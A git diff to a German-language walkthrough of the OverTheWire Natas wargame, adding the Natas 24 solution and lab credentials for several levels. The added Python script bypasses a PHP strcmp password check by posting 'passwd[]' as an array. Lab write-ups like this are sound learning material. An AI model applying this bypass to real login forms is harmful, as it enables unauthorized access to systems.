@@ -425,7 +425,7 @@ Passwort: `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs  `
 
 Die PHPSESSID ist zws. 1 und 640-admin als Hex-wert codiert.
 
-```Python
+```python
 import requests
 
 auth_user = "natas19"
@@ -520,4 +520,25 @@ Durch die Abfrage, ob `$_REQUEST["passwd"]` größer 10 ist, wird der String in 
 
 Zugriff:	[http://natas24.natas.labs.overthewire.org](http://natas24.natas.labs.overthewire.org)
 Username: `natas24`
-Passwort: OsRmXFguozKpTZZ5X14zNO43379LZveg
+Passwort: `OsRmXFguozKpTZZ5X14zNO43379LZveg`
+
+`strcmp` gibt 0 zurück, falls der Vergleich fehlschlägt.
+
+```python
+import requests
+
+auth_user = "natas24"
+auth_password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
+
+url = "http://natas24.natas.labs.overthewire.org/"
+data = {'passwd[]':'array(0=>"")'}
+
+r = requests.post(url=url, auth=(auth_user, auth_password), data=data)
+print(r.text)
+```
+
+# Natas 25
+
+Zugriff:	[http://natas25.natas.labs.overthewire.org](http://natas25.natas.labs.overthewire.org)
+Username: `natas25`
+Passwort: `GHF6X7YwACaYYssHVY05cFq83hRktl4c`
